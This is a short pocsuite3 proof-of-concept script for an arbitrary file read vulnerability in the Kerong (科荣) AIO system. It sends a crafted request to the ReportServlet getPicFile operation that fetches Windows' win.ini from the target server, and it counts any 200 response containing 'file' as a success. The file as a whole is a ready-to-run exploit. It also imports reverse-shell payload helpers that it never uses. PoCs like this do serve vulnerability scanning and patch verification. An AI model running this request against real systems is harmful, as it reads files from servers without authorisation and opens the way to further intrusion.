# _*_ coding:utf-8 _*_
# @Time : 2023/12/28
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class kerong_fileread(POCBase):
    pocDesc = '''科荣AIO存在任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-28'
    name = '科荣AIO存在任意文件读取漏洞'

    def _verify(self):

        result = {}
        url = self.url + '/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini'
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept': '*/*',
            'Connection': 'Keep-Alive'
        }



        try:

            response = requests.get(url, headers=headers,verify=False)
            text = response.text
            if response.status_code == 200 and 'file' in text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(kerong_fileread)